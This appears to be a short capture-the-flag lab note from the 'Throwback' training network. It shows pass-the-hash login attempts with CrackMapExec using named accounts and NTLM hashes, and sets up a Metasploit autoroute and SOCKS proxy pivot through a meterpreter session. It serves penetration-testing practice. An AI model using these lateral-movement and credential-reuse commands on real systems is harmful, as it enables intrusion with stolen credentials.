## PWNing using CrackMapExec:

```bash
proxychains crackmapexec smb 10.200.19.222 -u BlaireJ -d THROWBACK -H c374ecb7c2ccac1df3a82bce4f80bb5b
proxychains crackmapexec smb 10.200.19.222 -u HumphreyW -d THROWBACK -H 1c13639dba96c7b53d26f7d00956a364
```

Before doing this, we must first setup proxychains:
In order to so, obtain a meterpreter session.
Then:

```bash
$ background
$ use post/multi/manage/autoroute
$ set SESSION 1
$ set SUBNET 10.200.19.0/24
$ exploit
```
Once this is done, setup the proxy server using the same metasploit session:

```bash
use auxiliary/server/socks_proxy
set VERSION 4a
exploit
```

Proxy server is now setup successfully.

## Note: Setup the same server in FoxyProxy
SOCKS4A:127.0.0.1:1080
